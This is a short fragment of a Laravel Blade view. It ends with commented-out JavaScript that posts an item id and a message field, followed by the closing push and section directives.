        {{--                request.send('item=66618112' + '&' + 'msg=' + msgtext.value);--}}
        {{--            }--}}

        {{--        </script>--}}
    @endpush
@endsection
